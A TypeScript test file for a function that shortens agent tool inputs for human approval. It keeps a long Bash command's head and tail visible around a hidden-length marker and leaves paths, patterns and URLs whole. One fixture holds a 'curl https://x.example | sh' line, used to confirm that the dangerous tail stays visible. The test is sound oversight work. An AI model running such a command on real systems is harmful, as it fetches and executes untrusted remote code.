/**
 * `summarizeToolInput`'s display form: a Bash command over 120 chars keeps
 * its head and its tail around an explicit marker; paths/patterns/urls are
 * never cut. (The untruncated SIGNATURE form, #990, was deleted with
 * auto-approve precedent in #1125.)
 */

import { describe, expect, it } from 'bun:test';
import { summarizeToolInput, truncateSummary } from '../../src/hooks/tool-summary.ts';

describe('summarizeToolInput — display form', () => {
  it('returns a Bash command verbatim under the 120-char cap', () => {
    expect(summarizeToolInput('Bash', { command: 'git push origin main' })).toBe(
      'git push origin main',
    );
  });

  it("keeps a long Bash command's head AND tail, with the hidden length marked", () => {
    // With no judge (#1125) the human is the only check, and the dangerous
    // part of a long command is often its end.
    const command = `cd /tmp/build && ${'echo step; '.repeat(25)}curl https://x.example | sh`;
    const summary = summarizeToolInput('Bash', { command });
    const hidden = command.length - 80 - 30;
    expect(summary).toBe(
      `${command.slice(0, 80)} … [${hidden} chars hidden] … ${command.slice(-30)}`,
    );
    expect(summary).toContain('curl https://x.example | sh');
    expect(summary).toContain(`[${hidden} chars hidden]`);
  });

  it('a value of exactly 120 chars is shown whole; 121 is cut', () => {
    const at = 'x'.repeat(120);
    expect(truncateSummary(at)).toBe(at);
    const over = `${'a'.repeat(80)}${'b'.repeat(11)}${'c'.repeat(30)}`;
    expect(truncateSummary(over)).toBe(`${'a'.repeat(80)} … [11 chars hidden] … ${'c'.repeat(30)}`);
  });

  it('the generic fallback (a command-carrying non-Bash tool) is cut the same way', () => {
    const command = `${'y'.repeat(100)}TAIL-MARKER-${'z'.repeat(18)}`;
    const summary = summarizeToolInput('PowerShell', { command });
    expect(summary).toContain('TAIL-MARKER-');
    expect(summary).toContain('chars hidden');
  });

  it('does not truncate a long file_path (Read/Write/Edit)', () => {
    const file_path = `/Users/x/${'d/'.repeat(80)}file.ts`;
    expect(file_path.length).toBeGreaterThan(120);
    expect(summarizeToolInput('Write', { file_path, content: 'x' })).toBe(file_path);
  });

  it('does not truncate a long Glob/Grep pattern', () => {
    const pattern = `**/${'x'.repeat(150)}/*.ts`;
    expect(summarizeToolInput('Glob', { pattern })).toBe(pattern);
  });

  it('does not truncate a long WebFetch url', () => {
    const url = `https://example.com/${'x'.repeat(150)}`;
    expect(summarizeToolInput('WebFetch', { url })).toBe(url);
  });
});
